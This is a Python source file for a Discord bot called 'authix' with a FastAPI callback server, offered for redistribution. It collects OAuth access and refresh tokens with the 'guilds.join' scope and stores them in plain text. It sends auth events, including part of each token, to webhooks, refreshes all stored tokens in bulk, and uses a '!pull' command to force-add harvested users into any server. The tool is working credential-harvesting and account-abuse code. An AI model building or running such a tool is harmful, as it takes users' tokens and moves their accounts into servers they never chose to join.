import discord
import requests
import json
import fastapi
import uvicorn
import os
import multiprocessing
import random
import time
import asyncio
import urllib.parse
import datetime

from discord.ext import commands
from multiprocessing import Process
from fastapi import Query
from fastapi.responses import HTMLResponse

#$ load stuff
with open('config.json', 'r') as f:
    stuff = json.load(f)

token = stuff.get('token')
secret = stuff.get('secret')
id = stuff.get('id')
redirect = stuff.get('redirect')
api = stuff.get('api_endpoint')
logs = stuff.get('logs')

#$ define fastapi and discord bot
app = fastapi.FastAPI()
intents = discord.Intents.all()
client = commands.Bot(command_prefix='!', intents=intents)
client.remove_command('help')

@client.event
async def on_ready():
    os.system('cls || clear')
    print(f"connected as: {client.user}")

def run_fastapi():
    uvicorn.run("app:app", reload=True)
    #$if you are hosting it on a server, comment out the above line and config the below line and remove the comment of the below line!
    #uvicorn.run("app:app",host='0.0.0.0',port=your-port-number-here, reload=True)

def keep_alive():
    Process(target=run_fastapi).start()

@client.command()
async def count(ctx):
    unique_count = 0
    if os.path.exists('auths.txt'):
        with open('auths.txt', 'r') as f:
            unique_users = set()
            for line in f:
                try:
                    user_id, _, _ = line.strip().split(',')
                    unique_users.add(user_id)
                except:
                    continue
            unique_count = len(unique_users)
    
    embed = discord.Embed(
        title="🔢 auth count",
        description=f"total unique auths: {unique_count}",
        color=discord.Color.green(),
        timestamp=datetime.datetime.now()
    )
    embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
    embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/counter.png")
    await ctx.send(embed=embed)

@app.get("/")
async def home():
    return "authix working fine!"

@app.get('/callback')
def authenticate(code=Query(...)):
    try:
        data = {
            'client_id': id,
            'client_secret': secret,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': redirect,
            'scope': 'identify guilds.join'
        }

        response = requests.post(f'{api}/oauth2/token', data=data)
        response.raise_for_status()
        details = response.json()

        access_token = details['access_token']
        refresh_token = details['refresh_token']

        headers = {'Authorization': f'Bearer {access_token}'}
        user_info = requests.get(f'{api}/users/@me', headers=headers).json()
        user_id = user_info['id']
        username = user_info.get('username', 'unknown')

        lines = []
        if os.path.exists('auths.txt'):
            with open('auths.txt', 'r') as file:
                lines = file.readlines()

        found = False
        for i, line in enumerate(lines):
            if line.startswith(f"{user_id},"):
                lines[i] = f'{user_id},{access_token},{refresh_token}\n'
                found = True
                break

        if not found:
            lines.append(f'{user_id},{access_token},{refresh_token}\n')

        with open('auths.txt', 'w') as file:
            file.writelines(lines)

        embed = discord.Embed(
            title="✅ authentication successful",
            description=f"welcome to the authix club, {username}!",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="user id", value=user_id, inline=True)
        embed.add_field(name="access token", value=access_token[:20] + "...", inline=True)
        embed.set_footer(text="authix • premium authentication service")
        embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/check.png")

        hook_url = random.choice(logs)
        log_data = {'embeds': [embed.to_dict()]}
        requests.post(hook_url, json=log_data)

        html_content = f"""
        <html>
            <head><title>authix success</title></head>
            <body style="background-color: #36393f; color: white; font-family: Arial, sans-serif; text-align: center; padding: 50px;">
                <h1>✅ authentication successful!</h1>
                <p>welcome to the authix club, {username}!</p>
                <p>you can now close this tab.</p>
            </body>
        </html>
        """
        return HTMLResponse(content=html_content)

    except Exception as e:
        print(f"auth error: {e}")
        embed = discord.Embed(
            title="❌ authentication failed",
            description=f"an error occurred during authentication: {str(e)}",
            color=discord.Color.red(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="authix • premium authentication service")
        embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/error.png")

        hook_url = random.choice(logs)
        log_data = {'embeds': [embed.to_dict()]}
        requests.post(hook_url, json=log_data)

        html_content = f"""
        <html>
            <head><title>authix error</title></head>
            <body style="background-color: #36393f; color: white; font-family: Arial, sans-serif; text-align: center; padding: 50px;">
                <h1>❌ authentication failed</h1>
                <p>an error occurred: {str(e)}</p>
                <p>please try again later.</p>
            </body>
        </html>
        """
        return HTMLResponse(content=html_content, status_code=500)

@client.command(name='refresh')
async def refresh(ctx):
    start_time = time.time()
    refreshed = []
    failed = []

    def progress_bar(current, total, length=20):
        filled_len = int(length * current // total)
        bar = '█' * filled_len + '—' * (length - filled_len)
        return f"[{bar}] {current}/{total}"

    try:
        if not os.path.exists('auths.txt'):
            embed = discord.Embed(
                title="⚠️ no auths found",
                description="the database is empty. nothing to refresh.",
                color=discord.Color.orange(),
                timestamp=datetime.datetime.now()
            )
            embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
            embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/empty-box.png")
            await ctx.send(embed=embed)
            return

        with open('auths.txt', 'r') as f:
            lines = f.readlines()

        unique_tokens = {}
        for line in lines:
            try:
                user_id, access_token, refresh_token = line.strip().split(',')
                unique_tokens[user_id] = (access_token, refresh_token)
            except:
                continue

        total = len(unique_tokens)
        if total == 0:
            embed = discord.Embed(
                title="⚠️ no valid auths found",
                description="the database has no valid entries. nothing to refresh.",
                color=discord.Color.orange(),
                timestamp=datetime.datetime.now()
            )
            embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
            embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/empty-box.png")
            await ctx.send(embed=embed)
            return

        new_lines = []
        processed = 0

        progress_embed = discord.Embed(
            title="🔄 refreshing tokens",
            description=f"progress: {progress_bar(0, total)}\nprocessed: 0/{total}",
            color=discord.Color.yellow(),
            timestamp=datetime.datetime.now()
        )
        progress_embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
        progress_embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/refresh.png")
        msg = await ctx.send(embed=progress_embed)

        for user_id, (access_token, refresh_token) in unique_tokens.items():
            processed += 1
            try:
                data = {
                    'client_id': id,
                    'client_secret': secret,
                    'grant_type': 'refresh_token',
                    'refresh_token': refresh_token,
                }
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                response = requests.post(f'{api}/oauth2/token', data=data, headers=headers)

                if response.status_code in (200, 201):
                    tokens = response.json()
                    new_access = tokens['access_token']
                    new_refresh = tokens['refresh_token']
                    new_lines.append(f'{user_id},{new_access},{new_refresh}\n')
                    refreshed.append(user_id)
                else:
                    failed.append(user_id)
            except Exception as e:
                print(f"error refreshing token for user {user_id}: {e}")
                failed.append(user_id)

            if processed % 5 == 0 or processed == total:
                progress_embed.description = f"progress: {progress_bar(processed, total)}\nprocessed: {processed}/{total}"
                progress_embed.timestamp = datetime.datetime.now()
                await msg.edit(embed=progress_embed)
                await asyncio.sleep(0.1)

        with open('auths.txt', 'w') as f:
            f.writelines(new_lines)

        total_time = int(time.time() - start_time)
        mins, secs = divmod(total_time, 60)
        time_str = f"{mins}m {secs}s"

        embed = discord.Embed(
            title="✅ token refresh complete",
            description=f"refreshed tokens for {len(refreshed)} users out of {total} in {time_str}\nfailed refreshes: {len(failed)}",
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
        embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/checked.png")
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ error during refresh",
            description=f"an error occurred during the refresh process: {str(e)}",
            color=discord.Color.red(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
        embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/error.png")
        await ctx.send(embed=embed)

@client.command(name='pull')
async def pull(ctx, amount: int):
    start_time = time.time()
    tries = 0
    added = 0
    failed = 0
    last_users = []

    def progress_bar(current, total, length=20):
        filled_len = int(length * current // total)
        bar = '█' * filled_len + '—' * (length - filled_len)
        return f"[{bar}] {current}/{total}"

    try:
        if not os.path.exists('auths.txt'):
            embed = discord.Embed(
                title="⚠️ no auths found",
                description="the database is empty. nothing to pull.",
                color=discord.Color.orange(),
                timestamp=datetime.datetime.now()
            )
            embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
            embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/empty-box.png")
            await ctx.send(embed=embed)
            return

        with open('auths.txt', 'r') as file:
            lines = file.readlines()

        unique_users = {}
        for line in lines:
            try:
                user_id, access_token, refresh_token = line.strip().split(',')
                unique_users[user_id] = (access_token, refresh_token)
            except:
                continue

        user_list = list(unique_users.items())
        random.shuffle(user_list)
        total_available = len(user_list)

        progress_embed = discord.Embed(
            title=f"🚀 pulling {amount} users into {ctx.guild.name}",
            description=f"progress: {progress_bar(0, amount)}\ntries: 0 | added: 0 | failed: 0",
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        progress_embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
        progress_embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/download.png")
        msg = await ctx.send(embed=progress_embed)

        while added < amount and user_list:
            tries += 1
            user_id, (access_token, refresh_token) = user_list.pop()
            success = add_member_to_guild(ctx.guild.id, user_id, access_token)
            if success:
                username = await fetch_username(access_token)
                last_users.append(f"{username} ({user_id})")
                added += 1
            else:
                failed += 1

            if tries % 5 == 0 or added == amount or not user_list:
                progress_embed.description = f"progress: {progress_bar(added, amount)}\ntries: {tries} | added: {added} | failed: {failed}\nlast added: {', '.join(last_users[-5:]) if last_users else 'none'}"
                progress_embed.timestamp = datetime.datetime.now()
                await msg.edit(embed=progress_embed)
                await asyncio.sleep(0.1)

        total_time = int(time.time() - start_time)
        mins, secs = divmod(total_time, 60)
        time_str = f"{mins}m {secs}s"

        embed = discord.Embed(
            title="✅ pull operation complete",
            description=f"pulled {added} users into {ctx.guild.name} with {failed} failures after {tries} tries in {time_str}.\nlast added users: {', '.join(last_users[-10:]) if last_users else 'none'}",
            color=discord.Color.green(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
        embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/checked.png")
        await ctx.send(embed=embed)

    except Exception as e:
        embed = discord.Embed(
            title="❌ error during pull",
            description=f"an error occurred during the pull operation: {str(e)}",
            color=discord.Color.red(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
        embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/error.png")
        await ctx.send(embed=embed)

def add_member_to_guild(guild_id, user_id, access_token):
    url = f"{api}/guilds/{guild_id}/members/{user_id}"
    data = {"access_token": access_token}
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }
    try:
        response = requests.put(url, headers=headers, json=data)
        return response.status_code in (201, 204)
    except Exception as e:
        print(f"join error: {e}")
        return False

async def fetch_username(access_token):
    headers = {'Authorization': f'Bearer {access_token}'}
    try:
        r = requests.get(f'{api}/users/@me', headers=headers)
        if r.status_code == 200:
            return r.json()['username']
        return "unknown"
    except:
        return "unknown"

@client.command()
async def help(ctx):
    embed = discord.Embed(
        title="📚 authix bot commands help",
        description="here's a premium list of available commands for authix bot:",
        color=discord.Color.purple(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="!count", value="displays the total number of unique auths in the database.", inline=False)
    embed.add_field(name="!refresh", value="refreshes tokens for all unique users in the database with progress updates.", inline=False)
    embed.add_field(name="!pull <amount>", value="pulls a specified amount of users into your server with live progress.", inline=False)
    embed.add_field(name="!auth_link", value="generates the authentication link for users to join.", inline=False)
    embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
    embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/help.png")

    await ctx.send(embed=embed)

@client.command(name="auth_link")
async def auth_link(ctx):
    params = {
        'client_id': id,
        'response_type': 'code',
        'redirect_uri': redirect,
        'scope': 'identify guilds.join'
    }
    url = "https://discord.com/oauth2/authorize?" + urllib.parse.urlencode(params)
    
    embed = discord.Embed(
        title="🔗 authentication link",
        description="click the link below to authenticate and join the premium authix service:",
        color=discord.Color.blue(),
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="authenticate here", value=f"[click to authenticate]({url})", inline=False)
    embed.set_footer(text="authix bot • premium authentication service", icon_url=client.user.avatar.url if client.user.avatar else None)
    embed.set_thumbnail(url="https://img.icons8.com/color/48/000000/link.png")

    await ctx.send(embed=embed)

#$ start bot and fastapi
if __name__ == "__main__":
    keep_alive()
    client.run(token, reconnect=True)

#$ credits
#$ updated by rubin b (fixed all bugs, converted flask -> fastapi)
#$ old version was also made by me (github: rubinexe)
#$ new github: pygod7 
#$ give credits if you re-distribute!
